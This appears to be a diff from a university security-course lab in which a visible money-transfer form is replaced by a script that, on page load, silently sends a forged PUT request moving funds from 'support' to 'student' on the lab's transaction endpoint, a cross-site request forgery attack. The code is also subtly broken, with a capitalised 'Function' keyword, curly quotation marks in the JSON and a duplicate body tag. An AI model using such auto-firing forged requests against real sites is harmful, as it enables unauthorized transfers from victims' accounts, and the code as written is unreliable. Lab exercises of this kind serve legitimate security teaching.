@@ -1,8 +1,13 @@
 <body>
-<form id="transaction_form" action="https://7268542.labs.csci3403.com/transaction" method="post">
-<input class="input" name="sender" type="hidden" value="support">
-<input class="input" name="recipient" type="hidden" value="student">
-<input class="input" name="amount" type="number" value="10.00" > 
-<input class="button is-info" id="send_money" type="submit" value="Send money">
- </form>
+<script>
+Function hack() {
+    var x = new XMLHttpRequest();
+    x.open("PUT","https://7268542.labs.csci3403.com/transaction",true);
+    x.setRequestHeader("Content-Type", "application/json");
+    x.send(JSON.stringify({"sender":"support",”recipient”:”student”, "amount":10})); 
+}
+</script>
+
+<body onload="hack()">
+
 </body>
